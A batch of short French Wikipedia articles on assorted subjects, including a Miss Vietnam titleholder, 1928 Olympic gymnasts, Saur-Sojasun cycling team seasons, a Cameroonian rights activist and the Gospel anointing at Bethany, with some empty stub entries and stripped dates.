Il divise le cortex cérébral de l'homme en 52 aires différentes selon la cytoarchitectonie, c'est-à-dire la densité, la taille des neurones et le nombre de couches observées sur des coupes histologiques.

</doc>
<doc id="7277667" url="https://fr.wikipedia.org/wiki?curid=7277667" title="Mai Phương Thúy">
Mai Phương Thúy

Mai Phương Thúy, née le à Hanoï, a été élue Miss Vietnam 2006. Elle est la Miss Vietnam.
Elle a été classée parmi les plus belles femmes du monde au concours annuel Miss Grand Slam sur globalbeauties.com en 2006.
Biographie.
Famille et études.
Mai Phương Thúy, fille de Nguyễn Phương Lan, ancienne fonctionnaire. Elle a également deux sœurs dont Mai Ngọc Phương. À l'âge de six ans, son père décède des suites d'une maladie affectant ses poumons. Elle a fait ses études au lycée Phan Dinh Phung et a été acceptée dans l'université Foreign Trade à Hanoï et l'université RMIT International. Avant de devenir Miss Vietnam, elle était membre d'une agence de mannequins qu'un ami lui a recommandé de rejoindre.
Élection Miss Vietnam 2006.
À l'âge de 19 ans, Mai Phương Thúy est élue Miss Vietnam 2006 le à Nha Trang et succède à Nguyễn Thị Huyền, Miss Vietnam 2004. Elle bat le record de la plus grande taille dans l'histoire de Miss Vietnam.
Ses dauphines :
Élection Miss Monde 2006.
Le , Mai Phương Thúy représente le Viêt Nam au concours de Miss Monde 2006 au Palais de la Culture et de la Science à Varsovie, en Pologne et se classe au top 17. Elle a atteint le top 20 des miss les mieux habillées. Lors du concours, elle portait la robe traditionnelle vietnamienne, l'áo dài qui a été conçu par le styliste vietnamien, Việt Hùng.
Carrière cinématographique.
Mai Phương Thúy accepte d'incarner le rôle de Lâm Uyển Nhi, une ancienne reine de beauté vietnamienne qui a sombré dans la dépression à l'arrestation de son mari et a plongé dans la toxicomanie et la prostitution et qui est décédée des suites du VIH dans la série télévisée biographique "Negative".
Engagement humanitaire et social.
Mai Phương Thúy a beaucoup voyagé pendant deux ans sous le titre de Miss Vietnam à aider des soldats blessés, des personnes âgées, des orphelins, des victimes de catastrophes naturelles ... Elle est considérée comme la plus charitable dans l'histoire de Miss Vietnam. En octobre 2006, Mai Phương Thúy se rend à l'aéroport international de Nội Bài pour partir en Pologne pour aider les victimes des inondations de l'ouragan.
En mars 2007, Mai Phương Thúy est choisie comme ambassadrice pour l'organisation Asia Injury Prevention Foundation (AIPF) avec le chanteur Đàm Vĩnh Hưng pour promouvoir le port du casque afin de réduire le nombre de victimes blessées ou décédées dans des accidents de la route. 
Depuis 2008, elle s'engage régulièrement dans les domaines de l'art comme le cinéma, les expositions et elle a suivi des cours de chant et de danse pour devenir chanteuse.
Du 6 au , elle participe pour l'organisation Operation Smile qui organise des soins chirurgicaux gratuits pour des enfants nés avec une fente labio-palatine et d'autres défauts dans les hôpitaux de Cần Thơ et du Delta du Mékong. Elle était accompagnée de l'ambassadeur de Operation Smile au Vietnam, l'acteur Jackie Chan ainsi que de Lý Nhã Kỳ, Đàm Vĩnh Hưng et de Mỹ Tâm.
Du 20 au , elle visite une banlieue à Hô-Chi-Minh-Ville, Go Vap où se trouve le village d'enfants SOS et rencontre la directrice de l'organisation, Mme Đặng Thị Hường. Parmi elle, d'autres personnalités connues y ont participé dont l'actrice et mannequin Ngọc Quyên, la chanteuse et actrice Thanh Ngọc, la chanteuse Trang Trần, l'acteur Hồ Vĩnh Khoa et le chanteur Hà Anh Tuấn.

</doc>
<doc id="7277683" url="https://fr.wikipedia.org/wiki?curid=7277683" title="Stella Akakpo">
Stella Akakpo

Stella Akakpo, née le à Villepinte, est une athlète française, spécialiste du sprint.
Biographie.
Elle remporte la médaille d'or sur 100 mètres lors des championnats d'Europe juniors 2013 à Rieti en 11 s 52, après avoir porté son record personnel à 11 s 26 en séries (+ 1,0 m/s) et établi les minima de qualification A pour les mondiaux de Moscou. Le , elle termine de la finale du relais 4x100m des Championnats du monde de Moscou en 42 s 73 derrière l'équipe de Jamaïque après une course époustouflante, mais les Françaises sont disqualifiées deux heures après le podium.
En , Akakpo est sacrée championne de France en salle du 60 m à Bordeaux. Le , elle se classe de la finale des Championnats de France à Reims sur 100 m malgré un nouveau record personnel à 11 s 24 (+ 1,5 m/s). Par conséquent, elle n'est pas sélectionnée sur l'épreuve individuelle pour les Championnats d'Europe de Zürich mais que sur le relais, où, en août suivant, les Françaises remportent la médaille d'argent.
Saison 2016 : le déclic.
Durant la saison hivernale 2016, la jeune française de 22 ans connaît un déclic et améliore son record personnel du 60 m, le passant de 7 s 29 à 7 s 19 puis 7 s 12 lors du meeting de Metz. Elle est sacrée championne de France en salle du 200 m en 23 s 27, sa nouvelle marque de référence.
Le , elle remporte le 100 m du meeting de Valence en 11 s 27, sa meilleure performance de la saison. La semaine suivante, elle est sacrée Championne de France à Angers en 11 s 17 (- 0,4 m/s), nouveau record personnel et minimas pour les Championnats d'Europe d'Amsterdam et une performance qui la tient à seulement 2/100e des minimas pour les Jeux olympiques de Rio. Elle devance sur le podium Floriane Gnafoua (11 s 20) et Céline Distel-Bonnet (11 s 32).
Début juillet, lors des Championnats d'Europe d'Amsterdam, Akakpo est disqualifiée en demi-finale du 100 m avec un temps de 0,096 millièmes : il y a faux-départ lorsque le temps de réaction est inférieur à 0,100 millièmes. Bien qu'elle ne porte pas réclamation, d'autres athlètes s'indignent de cette règle sur les réseaux sociaux et notamment le Britannique Richard Kilty, lui aussi disqualifié la veille avec 0,098 millièmes et espère une modification des règles. Plus de 200 personnes sont d'accord avec les propos de Kilty, notamment sa compatriote Dina Asher-Smith. Le , la Française se classe du relais 4 x 100 m en 43 s 05.
Saison 2017.
Stella Akakpo ouvre sa saison hivernale le au meeting de Tignes où elle s'impose sur le 60 m en 7 s 26, à 1 centième des minimas pour les Championnats d'Europe en salle de Belgrade. Elle devance Maroussia Paré (7 s 44). Elle réalise ces minimas lors des Championnats régionaux à Eaubonne le où elle réalise 7 s 23.
Elle continue le 31 à Reims où elle signe le chrono de 7 s 16, meilleure performance mondiale de l'année.
Vie privée.
Elle vit depuis son enfance à Crépy-en-Valois dans l'Oise et, depuis son obtention du baccalauréat en 2013, à l'INSEP à Paris, où elle poursuit son double projet Sport / Études. En , elle travaille a KPMG et est marraine de l'association Apehs, basée à Dakar (Sénégal), qui œuvre à destination des enfants autistes.

</doc>
<doc id="7277692" url="https://fr.wikipedia.org/wiki?curid=7277692" title="West Coast Riot">
West Coast Riot

West Coast Riot est un festival de musique suédois qui se déroule annuellement depuis 2008 à Göteborg, en Suède. Jusqu'en 2011, il se déroulait peu avant le Metaltown Festival, la production des deux festivals étant liée ; mais depuis 2012, les deux festivals sont distincts, se déroulant à un mois d'intervalle. La programmation de West Coast Riot est axée sur le punk rock, et ses différentes formes.
De 2008 à 2010, il se déroulait dans la zone de Frihamnen ; en 2011, il fut déplacé à Göteborg Galopp, une zone de jeux équestres. En 2012, il se déroulait à Röda Sten, un centre artistique de Göteborg.
La production du festival a annoncé le 15 janvier sur leur page Facebook qu'il ne se produirait pas en 2013, préférant focaliser la production sur l'édition 2014.

</doc>
<doc id="7277694" url="https://fr.wikipedia.org/wiki?curid=7277694" title="Ada Smith">
Ada Smith

Ada Smith, née le à Leigh et morte en août 1994 à Atherton, est une gymnaste artistique britannique.
Carrière.
Ada Smith remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille de bronze du concours général par équipes féminin avec Amy Jagger, Carrie Pickles, Annie Broadbent, Jessie Kite, Lucy Desmond, Doris Woods, Margaret Hartley, Queenie Judd, Midge Moreman, Ethel Seymour et Hilda Smith.

</doc>
<doc id="7277695" url="https://fr.wikipedia.org/wiki?curid=7277695" title="Montsinéry">
Montsinéry



</doc>
<doc id="7277697" url="https://fr.wikipedia.org/wiki?curid=7277697" title="Hilda Smith">
Hilda Smith

Hilda Smith, née le à Leigh et morte en janvier 1995 à Leigh, est une gymnaste artistique britannique.
Carrière.
Hilda Smith remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille de bronze du concours général par équipes féminin avec Amy Jagger, Carrie Pickles, Annie Broadbent, Jessie Kite, Lucy Desmond, Doris Woods, Margaret Hartley, Queenie Judd, Midge Moreman, Ethel Seymour et Ada Smith.

</doc>
<doc id="7277699" url="https://fr.wikipedia.org/wiki?curid=7277699" title="Lucy Desmond">
Lucy Desmond

Lucy Elizabeth Desmond, née le à Lambeth et morte en août 1992 dans le comté de Surrey, est une gymnaste artistique britannique.
Carrière.
Lucy Desmond remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille de bronze du concours général par équipes féminin avec Amy Jagger, Carrie Pickles, Annie Broadbent, Jessie Kite, Hilda Smith, Doris Woods, Margaret Hartley, Queenie Judd, Midge Moreman, Ethel Seymour et Ada Smith.

</doc>
<doc id="7277700" url="https://fr.wikipedia.org/wiki?curid=7277700" title="MTV Video Music Awards 2013">
MTV Video Music Awards 2013

Les MTV Video Music Awards 2013 ont eu lieu le au Barclays Center à Brooklyn. 
Nominations.
Vidéo de l'année.
Justin Timberlake – "Mirrors"
Meilleure vidéo masculine.
Bruno Mars – "Locked Out of Heaven"
Meilleure vidéo féminine.
Taylor Swift – "I Knew You Were Trouble"
Meilleur nouvel artiste.
Austin Mahone – "What About Love"
Meilleure vidéo pop.
Selena Gomez – "Come and Get It"
Meilleure vidéo rock.
Thirty Seconds to Mars – "Up in the Air"
Meilleure vidéo hip-hop.
Macklemore et Ryan Lewis (featuring Ray Dalton) – "Can't Hold Us"
Meilleure collaboration.
Pink (featuring Nate Ruess) – Just Give Me a Reason
Meilleure réalisation.
"'Justin Timberlake (featuring Jay-Z) – "Suit &amp; Tie"
Meilleure chorégraphie.
Bruno Mars – "Treasure"
Meilleurs effets visuels.
"'Capital Cities – "Safe and Sound"
Meilleure direction artistique.
Janelle Monáe (featuring Erykah Badu) – "Q.U.E.E.N."
Meilleure montage.
Justin Timberlake – "Mirrors"
Meilleure cinématographie dans une vidéo.
Macklemore et Ryan Lewis (featuring Ray Dalton) – Can't Hold Us
Meilleur clip vidéo comportant un message social.
Macklemore et Ryan Lewis (featuring Mary Lambert) – Same Love
Meilleure chanson de l'été.
One Direction – "Best Song Ever"
Performances.
La liste des performances a été confirmée dans l'ordre alphabétique suivant :
Présentateurs.
Liste des présentateurs confirmés :

</doc>
<doc id="7277702" url="https://fr.wikipedia.org/wiki?curid=7277702" title="Queenie Judd">
Queenie Judd

Isabel Rose M. Judd dite Queenie Judd, née le à West Ham et morte en novembre 1995 dans le Pembrokeshire, est une gymnaste artistique britannique.
Carrière.
Queenie Judd remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille de bronze du concours général par équipes féminin avec Amy Jagger, Carrie Pickles, Annie Broadbent, Jessie Kite, Hilda Smith, Doris Woods, Margaret Hartley, Lucy Desmond, Midge Moreman, Ethel Seymour et Ada Smith.

</doc>
<doc id="7277703" url="https://fr.wikipedia.org/wiki?curid=7277703" title="Midge Moreman">
Midge Moreman

Marjorie Daisy Norton Moreman dite Midge Moreman, née le au Mont Âbû (Inde) et morte en septembre 1987 à Southampton (Angleterre), est une gymnaste artistique britannique.
Carrière.
Midge Moreman remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille de bronze du concours général par équipes féminin avec Amy Jagger, Carrie Pickles, Annie Broadbent, Jessie Kite, Hilda Smith, Doris Woods, Margaret Hartley, Lucy Desmond, Queenie Judd, Ethel Seymour et Ada Smith.

</doc>
<doc id="7277704" url="https://fr.wikipedia.org/wiki?curid=7277704" title="Marjorie Moreman">
Marjorie Moreman



</doc>
<doc id="7277705" url="https://fr.wikipedia.org/wiki?curid=7277705" title="Rhizome (Philosophie)">
Rhizome (Philosophie)



</doc>
<doc id="7277706" url="https://fr.wikipedia.org/wiki?curid=7277706" title="Ethel Seymour">
Ethel Seymour

Ethel Seymour ( - ) était une gymnaste artistique britannique.
Carrière.
Ethel Seymour remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille de bronze du concours général par équipes féminin avec Amy Jagger, Carrie Pickles, Annie Broadbent, Jessie Kite, Lucy Desmond, Doris Woods, Margaret Hartley, Queenie Judd, Midge Moreman, Ada Smith et Hilda Smith.

</doc>
<doc id="7277707" url="https://fr.wikipedia.org/wiki?curid=7277707" title="Cathédrale Santa Maria de Pampelune">
Cathédrale Santa Maria de Pampelune



</doc>
<doc id="7277711" url="https://fr.wikipedia.org/wiki?curid=7277711" title="Patrick Lateur">
Patrick Lateur

Patrick Lateur est un philologue classique, traducteur et poète belge d'expression néerlandaise né le à Beveren-Leie, près de Waregem.
Fin 2004, il succède à Hubert van Herreweghen à la Koninklijke Academie voor Nederlandse Taal- en Letterkunde.
Il publie en 2010 une traduction néerlandaise de l"'Iliade" en pentamètre iambique pour laquelle lui est décerné en le Prix de la communauté flamande de traduction littéraire.

</doc>
<doc id="7277712" url="https://fr.wikipedia.org/wiki?curid=7277712" title="Haby Niare">
Haby Niare



</doc>
<doc id="7277715" url="https://fr.wikipedia.org/wiki?curid=7277715" title="Ambrosetti">
Ambrosetti



</doc>
<doc id="7277716" url="https://fr.wikipedia.org/wiki?curid=7277716" title="Bianca Ambrosetti">
Bianca Ambrosetti

Bianca Ambrosetti, née le à Pavie et morte en novembre 1928 à Modène, est une gymnaste artistique italienne.
Carrière.
Bianca Ambrosetti remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Lavinia Gianoni, Luigina Perversi, Diana Pizzavini, Luigina Giavotti, Anna Luisa Tanzini, Carolina Tronconi, Ines Vercesi, Rita Vittadini, Virginia Giorgi, Germana Malabarba et Carla Marangoni.
Elle meurt de la tuberculose quelques mois après les Jeux.

</doc>
<doc id="7277717" url="https://fr.wikipedia.org/wiki?curid=7277717" title="Lavinia Gianoni">
Lavinia Gianoni

Lavinia Gianoni, née le à Pavie et morte le dans la même ville, est une gymnaste artistique italienne.
Carrière.
Lavinia Gianoni remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti, Luigina Perversi, Diana Pizzavini, Luigina Giavotti, Anna Luisa Tanzini, Carolina Tronconi, Ines Vercesi, Rita Vittadini, Virginia Giorgi, Germana Malabarba et Carla Marangoni.

</doc>
<doc id="7277718" url="https://fr.wikipedia.org/wiki?curid=7277718" title="Luigina Perversi">
Luigina Perversi

Luigina Perversi, née le à Pavie et morte le , est une gymnaste artistique italienne.
Carrière.
Luigina Perversi remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti, Lavinia Gianoni, Diana Pizzavini, Luigina Giavotti, Anna Luisa Tanzini, Carolina Tronconi, Ines Vercesi, Rita Vittadini, Virginia Giorgi, Germana Malabarba et Carla Marangoni.

</doc>
<doc id="7277719" url="https://fr.wikipedia.org/wiki?curid=7277719" title="Diana Pizzavini">
Diana Pizzavini

Diana Pizzavini, née le à Pavie et morte le , est une gymnaste artistique italienne.
Carrière.
Diana Pizzavini remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti, Lavinia Gianoni, Luigina Perversi, Luigina Giavotti, Anna Luisa Tanzini, Carolina Tronconi, Ines Vercesi, Rita Vittadini, Virginia Giorgi, Germana Malabarba et Carla Marangoni.

</doc>
<doc id="7277720" url="https://fr.wikipedia.org/wiki?curid=7277720" title="Guðmundur Steingrímsson">
Guðmundur Steingrímsson

Guðmundur Steingrímsson, né le à Reykjavik, est un homme politique islandais, membre d'Avenir radieux.
Biographie.
Il est élu député au Parlement islandais, l'Althing, dans la circonscription du Sud-Ouest, lors du scrutin de 2009 sous l'étiquette du Parti du progrès. En , il rompt avec cette formation en raison de désaccord sur les projets. L'année suivante, il est l'un des fondateurs du parti Avenir radieux, sous la bannière duquel il est réélu député en 2013. Il ne se représente pas aux élections d'octobre 2016.

</doc>
<doc id="7277721" url="https://fr.wikipedia.org/wiki?curid=7277721" title="Eric Lembembe">
Eric Lembembe

Eric Ohena Lembembe (né en 1980 et mort à Yaoundé en ) était un militant camerounais des droits de l'homme, collaborateur régulier de l'ONG Human Rights Watch et actif dans la défense des droits LGBT au sein de l'ONG Cameroonian Fondation for AIDS (CAMFAIDS) dont il était le directeur.
Il a été assassiné en à Yaoundé, après avoir subi des actes de torture, provoquant l'indignation et l'inquiétude d'une partie de la population et de la communauté internationale.
Il était un défenseur des droits des personnes LGBT au Cameroun. Selon le chercheur Pyper Scharer (2014), Eric Lembembe avait dénoncé publiquement quelques semaines avant son assassinat les actes d'intimidation visant les groupes d'activistes pro-LGBT.
Cet homicide relance le débat sur le système juridique camerounais et la possible complaisance de la police envers les crimes homophobes, dénoncée par ses avocats, Michel Togué et Alice Nkom. Le silence du président Paul Biya sur ce crime a également été critiqué.
Selon plusieurs observateurs l'enquête sur le meurtre n'a pas été menée selon les règles ; ainsi par exemple les causes du décès n'ont pas été indiquées par le médecin de l'hôpital de Yaoundé. « L'enquête bâclée et les irrégularités de procédure dans l'affaire de l'assassinat d'Eric Ohena Lembembe sont révélatrices de l'impunité garantie aux auteurs des violences commises contre les personnes LGBTI et les défenseurs de leurs droits, » selon un rapport de la FIDH.
Il fait partie des figures LGBT considérées comme iconiques par le Centre pour les droits humains de l'Université de Pretoria (en 2017).
Des commémorations de la mort de cet activiste sont organisées au Cameroun par des défenseurs des droits humains, notamment en 2018 et en 2020.

</doc>
<doc id="7277725" url="https://fr.wikipedia.org/wiki?curid=7277725" title="Andrew Brown (journaliste)">
Andrew Brown (journaliste)

Andrew Brown, né en 1955 à Londres, est un journaliste, écrivain et éditeur britannique. Il a travaillé en tant qu'éditorialiste dans la rubrique « Croyance » pour le journal "The Guardian" et comme rédacteur du journal "Church Times". Andrew Brown a par ailleurs contribué à d'autres journaux prestigieux comme le "New Statesman" et le "New York Review of Books".

</doc>
<doc id="7277832" url="https://fr.wikipedia.org/wiki?curid=7277832" title="Élections à la Chambre des conseillers du Japon de 2013">
Élections à la Chambre des conseillers du Japon de 2013

Les à la Chambre des conseillers du Japon, la chambre haute de la Diète (Parlement national), se sont déroulées le .
Elles sont remportées par le Parti libéral-démocrate du Premier ministre Shinzō Abe.
A l'échelle nationale, un regain de popularité du parti communiste japonais est à observer, qui pourrait être corrélé à la catastrophe de Fukushima, le parti communiste japonais étant clair sur ses positions anti-nucléaires. Par exemple, Yoshiko Kira est élue députée communiste dans le district de Tokyo, une première depuis douze ans. 

</doc>
<doc id="7277833" url="https://fr.wikipedia.org/wiki?curid=7277833" title="Parti du sauvetage national du Cambodge">
Parti du sauvetage national du Cambodge

Le Parti du sauvetage national du Cambodge ou Parti du salut national du Cambodge (PSNC) est une coalition politique cambodgienne, principale opposition politique du pays.
Il s'agit d'une alliance entre plusieurs partis d'opposition dont notamment le parti Sam Rainsy et le parti des droits de l'homme en vue de gagner les élections législatives de 2013.
Le , le chef du parti, Kem Sokha, est inculpé pour , alors que l'autre dirigeant du parti, Sam Rainsy, est de nouveau en exil en France. L'origine de cette inculpation semble provenir du chef du gouvernement, le Premier ministre Hun Sen, en prévision des élections législatives de 2018. Le , le parti est dissous par la Cour suprême.

</doc>
<doc id="7277837" url="https://fr.wikipedia.org/wiki?curid=7277837" title="Août 1956">
Août 1956



</doc>
<doc id="7277839" url="https://fr.wikipedia.org/wiki?curid=7277839" title="Batture aux Alouettes">
Batture aux Alouettes

La Batture aux Alouettes est un estran à la municipalité de Baie-Sainte-Catherine au Québec, Canada, aux coordonnés .
Conservation des oiseaux.
La Batture aux Alouettes est une zone importante pour la conservation des oiseaux (ZICO).
Incidents maritimes.
Le 19 juillet 1996, lors de la tempête ayant causé ce qu'il est convenu d'appeler «Le déluge du Saguenay», le Belle-Isle, un voilier de 8 mètres parti de Rivière-du-Loup vers le Saguenay avec trois personnes à son bord s'échoua sur ces battures. Un appel du capitaine en après-midi fit état que son navire faisait eau et qu'il ne tiendrait pas longtemps. Le «Journal de Québec» rapportera 20 ans plus tard, quelques jours avant le vingtième anniversaire du drame qu'« À 15 h 10, la voix du capitaine s’est fait entendre pour la dernière fois. Malgré les recherches de plusieurs navires et même d’un hélicoptère de l’armée «dans des conditions dépassant parfois les limites de l’appareil», jamais le Belle-Isle n’a été retrouvé, même vingt ans plus tard.
Le capitaine Guy Bégin a été retrouvé deux jours après au large de l’île aux Pommes, près de Rimouski. La dépouille de Madame Hélène Racine a quant à elle été retrouvée sur l’île aux Lièvres huit jours plus tard. À ce jour (20 juillet 2016), le corps de Denis Samson conjoint de cette dernière n’a toujours pas été retrouvé.»
En juillet 2013, le navire à passagers Grand Charlevoix, un bateau d'observation des baleines transportant 38 personnes, est entré en contact avec le fond et a endommagé sa coque près de la Batture aux Alouettes.

</doc>
<doc id="7277842" url="https://fr.wikipedia.org/wiki?curid=7277842" title="Juillet 1956">
Juillet 1956

Cette page présente les faits marquants du mois de .

</doc>
<doc id="7277846" url="https://fr.wikipedia.org/wiki?curid=7277846" title="Juin 1956">
Juin 1956



</doc>
<doc id="7277850" url="https://fr.wikipedia.org/wiki?curid=7277850" title="Mai 1956">
Mai 1956



</doc>
<doc id="7277853" url="https://fr.wikipedia.org/wiki?curid=7277853" title="Avril 1956">
Avril 1956



</doc>
<doc id="7277855" url="https://fr.wikipedia.org/wiki?curid=7277855" title="Ɛ̰́">
Ɛ̰́

Ɛ̰́ (minuscule : ɛ̰́), appelé epsilon tilde souscrit accent aigu, est un graphème utilisé dans l’écriture du mbelime et du nateni.
Il s’agit de la lettre epsilon diacritée d’un tilde souscrit et d’un accent aigu.
Représentations informatiques.
L’epsilon tilde souscrit accent aigu peut être représenté avec les caractères Unicode suivants :

</doc>
<doc id="7277856" url="https://fr.wikipedia.org/wiki?curid=7277856" title="Ɛ̰̀">
Ɛ̰̀

Ɛ̰̀ (minuscule : ɛ̰̀), appelé epsilon tilde souscrit accent grave, est un graphème utilisé dans l’écriture du nateni.
Il s’agit de la lettre epsilon diacritée d’un tilde souscrit et d’un accent grave.
Représentations informatiques.
L’epsilon tilde souscrit accent grave peut être représenté avec les caractères Unicode suivants :

</doc>
<doc id="7277858" url="https://fr.wikipedia.org/wiki?curid=7277858" title="Ɛ̰̄">
Ɛ̰̄

Ɛ̰̄ (minuscule : ɛ̰̄), appelé epsilon tilde souscrit macron, est un graphème utilisé dans l’écriture du mbèlimè et du nateni.
Il s’agit de la lettre epsilon diacritée d’un tilde souscrit et d’un macron.
Représentations informatiques.
L’epsilon tilde souscrit macron peut être représenté avec les caractères Unicode suivants :

</doc>
<doc id="7277860" url="https://fr.wikipedia.org/wiki?curid=7277860" title="Ciutat Esportiva Joan Gamper">
Ciutat Esportiva Joan Gamper



</doc>
<doc id="7277861" url="https://fr.wikipedia.org/wiki?curid=7277861" title="Février 1956">
Février 1956



</doc>
<doc id="7277866" url="https://fr.wikipedia.org/wiki?curid=7277866" title="Ɔ̰̄">
Ɔ̰̄

Ɔ̰̄ (minuscule : ɔ̰̄), appelé o ouvert tilde souscrit macron, est un graphème utilisé dans l’écriture du mbelime.
Il s’agit de la lettre o ouvert diacritée d’un tilde souscrit et d’un macron.
Représentations informatiques.
L’o ouvert tilde souscrit macron peut être représenté avec les caractères Unicode suivants :

</doc>
<doc id="7277867" url="https://fr.wikipedia.org/wiki?curid=7277867" title="Ɔ̰́">
Ɔ̰́

Ɔ̰́ (minuscule : ɔ̰́), appelé o ouvert tilde souscrit accent aigu, est un graphème utilisé dans l’écriture du mbelime et du nateni.
Il s’agit de la lettre o ouvert diacritée d’un tilde souscrit et d’un accent aigu.
Représentations informatiques.
L’o ouvert tilde souscrit accent aigu peut être représenté avec les caractères Unicode suivants :

</doc>
<doc id="7277875" url="https://fr.wikipedia.org/wiki?curid=7277875" title="Janvier 1956">
Janvier 1956

Cette page présente les faits marquants du mois de .

</doc>
<doc id="7277901" url="https://fr.wikipedia.org/wiki?curid=7277901" title="Supercoupe de Belgique de football 2013">
Supercoupe de Belgique de football 2013

La Supercoupe de Belgique 2013 est un match de football qui oppose le champion belge 2012-2013, le RSC Anderlecht au vainqueur de la Coupe de Belgique 2012-2013, le KRC Genk.

</doc>
<doc id="7277907" url="https://fr.wikipedia.org/wiki?curid=7277907" title="Saison 2012 de l'équipe cycliste Saur-Sojasun">
Saison 2012 de l'équipe cycliste Saur-Sojasun

La saison 2012 de l'équipe cycliste Saur-Sojasun est la quatrième de l'équipe dirigée par Stéphane Heulot. En tant qu'équipe continentale professionnelle, elle peut participer aux différentes courses des circuits continentaux de cyclisme. Elle est admissible aux épreuves de l'UCI World Tour sur invitations des organisateurs des courses.
L'équipe Saur-Sojasun remporte 17 victoires durant l'année 2012. Julien Simon, avec 5 succès, est le principal contributeur de ces résultats, il est également classé de l'UCI Europe Tour. Saur-Sojasun remporte le classement par équipes.
Bilan de la saison.
Résultats sur les courses majeures.
Les tableaux suivants représentent les résultats de l'équipe dans les principales courses du calendrier international dans lesquelles l'équipe bénéficie d'une invitation (deux des cinq classiques majeures et le Tour de France). Pour chaque épreuve est indiqué le meilleur coureur de l'équipe, son classement ainsi que les accessits glanés par Saur-Sojasun sur les courses de trois semaines.
Classement UCI.
UCI Europe Tour.
L'équipe Saur-Sojasun termine à la première place de l'Europe Tour avec points. Ce total est obtenu par l'addition des points des huit meilleurs coureurs de l'équipe au classement individuel.

</doc>
<doc id="7277908" url="https://fr.wikipedia.org/wiki?curid=7277908" title="Onction à Béthanie">
Onction à Béthanie

Lonction à Béthanie, épisode parfois appelé repas chez Simon, est une scène de la vie du Christ relatée par les quatre Évangiles (Matthieu (), Marc (), Luc () et Jean ()), mais avec de grandes divergences sur le lieu, la personnalité de la femme, le nom de l'hôte et les paroles de Jésus.
Les trois « Madeleine » (et les deux « Simon »).
La tradition a très tôt confondu en la personne de Madeleine trois femmes de l'Évangile : la pécheresse anonyme de Luc dans le repas chez Simon le Pharisien ; Marie de Béthanie, sœur de Marthe et Lazare chez Simon le lépreux ; Marie de Magdala (Marie-Madeleine), convertie par Jésus, présente au pied de la croix, à la mise au Tombeau et première personne à rencontrer le Christ ressuscité. Grégoire, au , considéra que Marie de Magdala ne faisait qu'une avec Marie de Béthanie et avec la pécheresse qui oint le Christ de parfum chez Luc. Cette interprétation n'est pas canonique, même si la tradition populaire l'a fortement propagée. 
L'historien Thierry Murcia, dans son ouvrage sur Marie-Madeleine, a proposé d'identifier la pécheresse anonyme de Luc (Luc 7, 36-50) à Jeanne, femme de Chouza qui, comme Marie-Madeleine, fait sa première apparition chez cet évangéliste immédiatement après l'épisode du repas chez Simon (Luc 8, 2-3).
Le "Repas chez Simon", comme la "Cène", convenait tout particulièrement à la décoration des réfectoires des couvents.
Le récit de Luc.
Voici le passage de l'Évangile de Luc
Représentations iconographiques.
Selon le récit retenu, et surtout selon l'époque, la scène est plus ou moins solennelle. Il existe également un ensemble de vitraux représentant la scène.

</doc>
<doc id="7277912" url="https://fr.wikipedia.org/wiki?curid=7277912" title="Saison 2011 de l'équipe cycliste Saur-Sojasun">
Saison 2011 de l'équipe cycliste Saur-Sojasun

La saison 2011 de l'équipe cycliste Saur-Sojasun est la troisième de l'équipe dirigée par Stéphane Heulot. En tant qu'équipe continentale professionnelle, elle peut participer aux différentes courses des circuits continentaux de cyclisme. Elle est admissible aux épreuves de l'UCI World Tour sur invitations des organisateurs des courses
L'équipe Saur-Sojasun remporte 19 victoires durant l'année 2011. Jimmy Casper, avec 6 succès, est le principal contributeur de ces résultats. Julien Simon est classé de l'UCI Europe Tour. Saur-Sojasun termine à la du classement par équipes.
Bilan de la saison.
Résultats sur les courses majeures.
Les tableaux suivants représentent les résultats de l'équipe dans les principales courses du calendrier international dans lesquelles l'équipe bénéficie d'une invitation (deux des cinq classiques majeures et le Tour de France). Pour chaque épreuve est indiqué le meilleur coureur de l'équipe, son classement ainsi que les accessits glanés par Saur-Sojasun sur les courses de trois semaines.
Classement UCI.
UCI Europe Tour.
L'équipe Saur-Sojasun termine à la quatrième place de l'Europe Tour avec points. Ce total est obtenu par l'addition des points des huit meilleurs coureurs de l'équipe au classement individuel.

</doc>
<doc id="7277917" url="https://fr.wikipedia.org/wiki?curid=7277917" title="Saison 2010 de l'équipe cycliste Saur-Sojasun">
Saison 2010 de l'équipe cycliste Saur-Sojasun

La saison 2010 de l'équipe cycliste Sojasun est la deuxième de l'équipe dirigée par Stéphane Heulot. En tant qu'équipe continentale professionnelle, elle peut participer aux différentes courses des circuits continentaux de cyclisme. Elle est admissible aux épreuves du Calendrier mondial UCI sur invitations des organisateurs des courses. L'équipe Saur-Sojasun termine la saison à la vingt-septième place du classement mondial, c'est la dixième équipe continentale professionnelle de ce classement, à la deuxième place de l'UCI Europe Tour et à la cinquante-septième place de l'UCI Asia Tour, et a gagné 26 courses du calendrier international de l'UCI. Jimmy Casper, avec 7 succès, est le principal contributeur de ces résultats. Jérôme Coppel est classé de l'UCI Europe Tour.
Bilan de la saison.
Résultats sur les courses majeures.
Les tableaux suivants représentent les résultats de l'équipe dans les principales courses du calendrier international dans lesquelles l'équipe bénéficie d'une invitation (une des cinq classiques majeures). Pour chaque épreuve est indiqué le meilleur coureur de l'équipe, son classement ainsi que les accessits glanés par Saur-Sojasun sur les courses de trois semaines.
Classements UCI.
Calendrier mondial UCI.
L'équipe Saur-Sojasun termine à la vingt-septième place du Calendrier mondial avec 63 points. Ce total est obtenu par l'addition des points des cinq meilleurs coureurs de l'équipe au classement individuel, cependant seuls deux coureurs sont classés que sont Jérôme Coppel, avec 61 points, et Jérémie Galland, avec 2 points. Les points de l'équipe ont été acquis lors des 4 épreuves auxquelles Saur-Sojasun a pris part, sur les 26 que comprend le Calendrier mondial.
UCI Asia Tour.
